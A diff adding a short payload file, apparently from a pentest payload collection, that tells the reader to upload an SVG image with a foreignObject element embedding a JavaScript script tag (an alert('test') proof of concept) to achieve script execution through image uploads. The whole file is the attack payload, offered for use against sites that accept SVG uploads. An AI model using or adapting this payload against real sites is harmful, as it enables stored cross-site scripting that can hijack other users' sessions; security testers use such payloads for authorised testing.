@@ -1,0 +1,11 @@
+// If you can upload images, try to upload an SVG
+// With this just before the /svg tag
+// https://www.linkedin.com/pulse/promptless-code-execution-via-vector-graph-embedded-ken-foster/
+
+<foreignObject class="node">
+  <head>
+  </head>
+  <script type="text/javascript">alert('test')</script>
+  <body xmlns="http://www.w3.org/1999/xhtml">
+  </body>
+</foreignObject>
